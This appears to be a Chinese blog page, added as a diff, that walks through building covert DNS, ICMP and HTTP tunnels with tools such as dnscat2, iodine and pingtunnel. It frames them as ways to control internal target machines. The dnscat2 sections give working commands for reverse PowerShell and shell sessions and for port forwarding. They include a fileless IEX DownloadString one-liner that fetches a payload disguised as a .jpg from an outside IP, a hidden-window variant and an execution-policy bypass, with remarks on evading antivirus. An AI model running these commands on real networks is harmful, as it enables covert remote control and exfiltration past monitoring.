@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CKMT2J522R"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-CKMT2J522R', { 'anonymize_ip': false });
+}
+</script>
+
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>
+      
+  DNS&amp;ICMP隧道搭建 &ndash; 春田花花幼稚园
+
+    </title>
+    
+    
+    <meta name="description" property="og:description" content="测试市面上的UDP ICMP隧道。
+|blog under go1f.github.io">
+    
+
+    <meta name="apple-mobile-web-app-title" content="春田花花幼稚园">
+    
+    
+    <link rel="icon" href="/favicon-64.png">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    <link rel="mask-icon" size="any" href="/pinned-icon.svg">
+    
+    
+    
+
+
+    <link rel="stylesheet" href="/assets/syntax.css">
+    <link rel="stylesheet" href="/assets/primer-build.css">
+    <link rel="stylesheet" href="/assets/style.css">
+  </head>
+
+
+  <body class="bg-gray">
+    <div id="holy" class="container-lg bg-white h-100">
+
+      <div id="header" class="px-1 bg-white">
+        <nav class="UnderlineNav UnderlineNav--right px-2">
+  <a class="UnderlineNav-actions muted-link h2" href="http://92643.cn:92">
+    春田花花幼稚园
+  </a>
+
+  
+  
+  <div class="UnderlineNav-body">
+    
+    
+    
+    <a class="UnderlineNav-item " href="/whisper/">
+      
+      <span>离骚</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/skill/">
+      
+      <span>拙技</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/glance/">
+      
+      <span>速览</span>
+    </a>
+    
+    
+  </div>
+  
+</nav>
+
+      </div>
+
+      <div role="main" id="main" class="holy-main markdown-body px-4 bg-white">
+        
+
+<div class="Subhead">
+  <div class="Subhead-heading">
+    <div class="h1 mt-3 mb-1">DNS&amp;ICMP隧道搭建</div>
+  </div>
+  <div class="Subhead-description">
+    
+
+
+
+
+
+
+    
+    <div class="float-md-right">
+      <span title="Lastmod: 2023-06-17. Published at: 2022-06-20.">
+        
+          Lastmod: 2023-06-17
+        
+      </span>
+    </div>
+    
+  </div>
+</div>
+<article>
+  
+  <section class="pb-6 mb-3 border-bottom">
+    <p>测试市面上的UDP ICMP隧道。</p>
+<h1 id="端口映射">端口映射</h1>
+<p><a href="https://blog.51cto.com/xuanwei/1957789">SNAT和DNAT的实现</a></p>
+<h1 id="dns隧道">DNS隧道</h1>
+<p>dns2tcp、dnscat2、Iodine、OzymanDNS、SplitBrain、TCP overDNS、TUNS、DeNise、Heyoka</p>
+<h2 id="dnscat2httpsgithubcomiagox86dnscat2"><a href="https://github.com/iagox86/dnscat2">dnscat2</a></h2>
+<p>实现内网靶机的端口映射到公网、shell控制、文件下载等功能。</p>
+<p>条件：一台公网IP的服务端，一个域名。</p>
+<p>运行环境：攻击机需要安装ruby。客户端可以源码编译，但面临病毒查杀问题。</p>
+<p>一、域名添加两条记录</p>
+<ol>
+<li>ns记录，log.allsec.top，值：ns1.allsec.top</li>
+<li>A记录，ns1.allsec.top，值：VPS的公网IP</li>
+</ol>
+<p>即，log.allsec.top的子域名下所有DNS解析，将交给ns1.allsec.top服务器处理。</p>
+<p>测试，在ns1.allsec.top（公网VPS）抓包DNS：</p>
+<pre tabindex="0"><code>root@ns1.allsec.top:~$ tcpdump udp dst port 53
+</code></pre><p>在任意本地发起解析请求：</p>
+<pre tabindex="0"><code>root@local:~$ nslookup aaa.log.allsec.top
+</code></pre><p>在ns1.allsec.top服务器，若tcpdump抓到对应的DNS请求，证明配置成功。</p>
+<p>二、服务端-环境搭建</p>
+<pre tabindex="0"><code>git clone https://github.com/iagox86/dnscat2
+cd dnscat2/server
+apt install gem ruby-dev libpq-dev
+gem install bundler
+bundle config mirror.https://rubygems.org https://mirrors.tuna.tsinghua.edu.cn/rubygems
+bundle install
+</code></pre><p>三、客户端</p>
+<p>下载二进制（不免杀）https://downloads.skullsecurity.org/dnscat2/</p>
+<p>或编译源码</p>
+<pre tabindex="0"><code>git clone https://github.com/iagox86/dnscat2
+cd dnscat2/client
+make
+</code></pre><p>运行</p>
+<pre tabindex="0"><code>./dnscat --secret=aaaa1111 log.allsec.top --delay 5000
+</code></pre><p>四、服务端</p>
+<p>1、服务端开启监听</p>
+<pre tabindex="0"><code>cd dnscat2/server
+sudo ruby dnscat2.rb log.allsec.top -c aaaa1111
+#-c 代表密钥值
+
+New window created: 1
+Session 1 Security: ENCRYPTED AND VERIFIED!
+(the security depends on the strength of your pre-shared secret!)
+dnscat2&gt; 
+#进入窗口1
+dnscat2&gt; window -i 1
+
+#反弹powershell
+dnscat2&gt; exec psh
+</code></pre><p>2、端口转发功能
+#映射内网22端口到VPS服务器的2222端口</p>
+<pre tabindex="0"><code>command (kali) 4&gt; listen 2222 192.168.174.149:22
+</code></pre><p>3、建立shell会话</p>
+<pre tabindex="0"><code>command (kali) 1&gt; shell
+Sent request to execute a shell
+command (kali) 1&gt; 
+New window created: 2
+Shell session created!
+New window created: 2
+
+To go back, type ctrl-z.
+</code></pre><p>切换到shell会话</p>
+<pre tabindex="0"><code>dnscat2&gt;
+dnscat2&gt; window -i 2
+</code></pre><p>执行命令</p>
+<pre tabindex="0"><code>sh (kali) 2&gt; ip a
+sh (kali) 2&gt; 1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+</code></pre><h2 id="dnscat2-powershellhttpsgithubcomlukebaggettdnscat2-powershell"><a href="https://github.com/lukebaggett/dnscat2-powershell">dnscat2-powershell</a></h2>
+<p>服务端：</p>
+<p>开启&ndash;no-cache，兼容powershell客户端。</p>
+<pre tabindex="0"><code>sudo ruby dnscat2.rb log.allsec.top -c aaaa1111 --no-cache
+</code></pre><p>客户端：</p>
+<p>准备客户端的powershell脚本：https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1，上载到云服务器，改名为jpg后缀。</p>
+<p>法一：（脚本不落地）</p>
+<pre tabindex="0"><code>#Powershell IEX加载
+IEX (New-Object System.Net.Webclient).DownloadString(&#39;http://114.132.230.157:9090/dnscat2-powershell.jpg&#39;)
+
+#启动客户端
+Start-Dnscat2 -Domain log.allsec.top -DNSServer ns1.allsec.top -PreSharedSecret aaaa1111
+#-DNSServer参数指定解析NS服务器，按道理不用设置的，可能DNSPod的NS记录同步不到其他DNS服务提供商，-PreSharedSecret参数为密钥
+
+
+#一句话（被杀了）估计是因为{powershell.exe -nop -w hidden -c}的结构
+powershell.exe -nop -w hidden -c {IEX(New-Object System.Net.Webclient).DownloadString(&#39;http://114.132.230.157:9090/dnscat2-powershell.jpg&#39;); Start-Dnscat2 -Domain log.allsec.top -DNSServer ns1.allsec.top -PreSharedSecret aaaa1111}
+</code></pre><p>法二：</p>
+<p>下载dnscat2-powershell.ps1到目标机</p>
+<pre tabindex="0"><code>powershell -exec bypass
+Import-Module .\dnscat2-powershell.ps1
+help dnscat2
+Start-Dnscat2 -Domain log.allsec.top -DNSServer ns1.allsec.top -PreSharedSecret aaaa1111
+#增加延迟、设置包大小上限，测试设置LookupTypes为A、AAAA记录会失败。
+Start-Dnscat2 -Domain log.allsec.top -DNSServer ns1.allsec.top -MaxRandomDelay 5 -MaxPacketSize 180 -LookupTypes @(&#34;CNAME&#34;,&#34;MX&#34;,&#34;TXT&#34;) -PreSharedSecret aaaa1111
+</code></pre><p>参考链接：</p>
+<p><a href="https://xz.aliyun.com/t/2214">Powershell+Dnscat2实现DNS隐蔽隧道反弹Shell</a></p>
+<h2 id="iodinehttpsgithubcomyarrickiodine"><a href="https://github.com/yarrick/iodine">iodine</a></h2>
+<p>现成的二进制包：https://code.kryo.se/iodine/</p>
+<p>C/S架构实现，客户端服务端间建立隧道互联。</p>
+<p>条件：一台公网IP的服务端，一个域名。</p>
+<p>运行环境：可以源码编译。</p>
+<p>服务端：</p>
+<p>环境搭建</p>
+<pre tabindex="0"><code>git clone https://github.com/yarrick/iodine
+cd iodine
+make
+</code></pre><p>运行服务端</p>
+<pre tabindex="0"><code>cd iodine/bin
+sudo ./iodined -f -c -P aaaa1111 172.16.110.110 log.allsec.top
+#sudo ./iodined -f -c -P password tunnel_ip[/netmask] topdomain
+#-f 保持前台运行， -P 密码，tunnel_ip[/netmask]为指定的隧道IP
+</code></pre><p>在线检查配置是否成功，https://code.kryo.se/iodine/check-it/，输入域名log.allsec.top</p>
+<p>客户端：</p>
+<p>windows。</p>
+<p>需要tun/tap虚拟网卡驱动，openvpn开源项目有tap驱动，以下链接下载安装。</p>
+<p>tap-windows-realease：https://build.openvpn.net/downloads/releases/</p>
+<p>面临网卡启动等netsh命令被杀毒拦截的问题。</p>
+<p>管理员权限。</p>
+<pre tabindex="0"><code>iodine.exe -f -P aaaa1111 ns1.allsec.top log.allsec.top
+#iodine.exe -f -P password [nameserver] topdomain
+#nameserver参数是DNS服务器。若不指定，则查找/etc/resolv.conf文件。nameserver is the IP number/hostname of the relaying nameserver. if absent, /etc/resolv.conf is used。
+#topdomain是你的域名。topdomain is the FQDN that is delegated to the tunnel endpoint.
+</code></pre><p>linux。</p>
+<pre tabindex="0"><code>#指定直连DNS服务器，流量更明显
+sudo ./iodine -f -P aaaa1111 ns1.allsec.top log.allsec.top
+#不指定
+sudo ./iodine -f -P aaaa1111 log.allsec.top
+</code></pre><p>参考链接</p>
+<p><a href="https://zhuanlan.zhihu.com/p/376330820">推荐一款非常好用的：Windows 虚拟网卡接口驱动</a></p>
+<p><a href="https://community.openvpn.net/openvpn/wiki/GettingTapWindows">Getting tap-windows releases - OpenVPN Community</a></p>
+<p><a href="https://www.wintun.net">Wintun</a></p>
+<h2 id="dns2tcphttpspackagesdebianorgsourcestretchdns2tcp"><a href="https://packages.debian.org/source/stretch/dns2tcp">dns2tcp</a></h2>
+<p><a href="https://salsa.debian.org/debian/dns2tcp">https://salsa.debian.org/debian/dns2tcp</a></p>
+<p>需要服务端是边界机（双网卡-公网IP+私网IP），客户端无要求。</p>
+<pre tabindex="0"><code>apt install dns2tcp
+</code></pre><h1 id="icmp隧道">ICMP隧道</h1>
+<h2 id="ptunnelhttpssalsadebianorgalteholzptunnel"><a href="https://salsa.debian.org/alteholz/ptunnel">ptunnel</a></h2>
+<p><a href="https://linux.die.net/man/8/ptunnel">ptunnel(8) - Linux man page</a></p>
+<p>服务端</p>
+<pre tabindex="0"><code>sudo ./ptunnel -udp
+</code></pre><p>客户端</p>
+<pre tabindex="0"><code>sudo ./ptunnel -p 114.132.230.157 -lp 8000 -da 114.132.230.157 -dp 8001 -c eth0 -udp
+</code></pre><p>参考链接</p>
+<p><a href="https://xz.aliyun.com/t/7701#toc-8">内网渗透之内网穿透</a></p>
+<h2 id="pingtunnelhttpsgithubcomesrrhspingtunnel"><a href="https://github.com/esrrhs/pingtunnel">pingtunnel</a></h2>
+<p>服务器端</p>
+<pre tabindex="0"><code>sudo ./pingtunnel -type server
+</code></pre><p>客户端</p>
+<p>搭建客户端1999端口到VPS的9999端口隧道，其中1999端口为绑定监听，服务器端则是转发流量到9999端口，需要另外运行工具来监听9999端口。</p>
+<pre tabindex="0"><code>sudo ./pingtunnel -type client -l :1999 -s 114.132.230.157 -t 114.132.230.157:9999 -tcp 1
+</code></pre><pre tabindex="0"><code>sudo ./pingtunnel -type client -l :1999 -s 114.132.230.157 -t 114.132.230.157:9999 -tcp 1
+</code></pre><p>内网通过隧道访问公网</p>
+<p>通过ICMP+socks5隧道，客户端通过本地监听4455的socks5端口上网</p>
+<pre tabindex="0"><code>sudo ./pingtunnel -type client -l :4455 -s 114.132.230.157 -sock5 1
+
+proxychains curl cip.cc
+</code></pre><p>参考文章：</p>
+<p><a href="http://t.zoukankan.com/cute-puli-p-15213394.html">ew+pingtunnel组合建立socks5隧道</a></p>
+<h1 id="http隧道">HTTP隧道</h1>
+<pre tabindex="0"><code>sudo apt install python2-dev
+python2 -m pip install pycrypto httplib2
+python2 abpttsfactory.py -o webshell
+</code></pre><p>2016年blackhat介绍：
+<a href="https://www.blackhat.com/us-16/arsenal.html#a-black-path-toward-the-sun">https://www.blackhat.com/us-16/arsenal.html#a-black-path-toward-the-sun</a>
+Github：
+<a href="https://github.com/nccgroup/ABPTTS">https://github.com/nccgroup/ABPTTS</a></p>
+<p><a href="https://github.com/nccgroup/ABPTTS.git">https://github.com/nccgroup/ABPTTS.git</a></p>
+<p>reGeorg</p>
+<p>2014年blackhat介绍
+<a href="https://www.blackhat.com/eu-14/arsenal.html#regeorg">https://www.blackhat.com/eu-14/arsenal.html#regeorg</a>
+Github：
+<a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p>
+<p>HTTP tunnel for Node.js (<a href="https://github.com/johncant/node-http-tunnel">https://github.com/johncant/node-http-tunnel</a>)</p>
+  </section>
+
+  <section>
+    
+      
+    
+  </section>
+</article>
+
+      </div>
+
+      <div id="side" class="pr-1 bg-white">
+        <aside class="pr-3">
+          
+  
+    <div id="toc" class="Box Box--blue mb-3">
+      <b>DNS&amp;ICMP隧道搭建</b><nav id="TableOfContents">
+  <ul>
+    <li><a href="#dnscat2httpsgithubcomiagox86dnscat2"><a href="https://github.com/iagox86/dnscat2">dnscat2</a></a></li>
+    <li><a href="#dnscat2-powershellhttpsgithubcomlukebaggettdnscat2-powershell"><a href="https://github.com/lukebaggett/dnscat2-powershell">dnscat2-powershell</a></a></li>
+    <li><a href="#iodinehttpsgithubcomyarrickiodine"><a href="https://github.com/yarrick/iodine">iodine</a></a></li>
+    <li><a href="#dns2tcphttpspackagesdebianorgsourcestretchdns2tcp"><a href="https://packages.debian.org/source/stretch/dns2tcp">dns2tcp</a></a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#ptunnelhttpssalsadebianorgalteholzptunnel"><a href="https://salsa.debian.org/alteholz/ptunnel">ptunnel</a></a></li>
+    <li><a href="#pingtunnelhttpsgithubcomesrrhspingtunnel"><a href="https://github.com/esrrhs/pingtunnel">pingtunnel</a></a></li>
+  </ul>
+</nav></div>
+  
+
+  
+    <div>
+      
+    </div>
+  
+
+        </aside>
+      </div>
+
+      <div id="footer" class="pt-2 pb-3 bg-white text-center">
+        
+
+  <span class="text-small text-gray">
+    © jyufu 2020-2023 &middot; 
+
+    Powered by the
+    <a href="https://github.com/qqhann/hugo-primer" class="link-gray-dark">Hugo-Primer</a> theme for
+    <a href="https://gohugo.io" class="link-gray-dark">Hugo</a>.
+  </span>
+
+
+      </div>
+    </div>
+
+    
+  </body>
+</html>
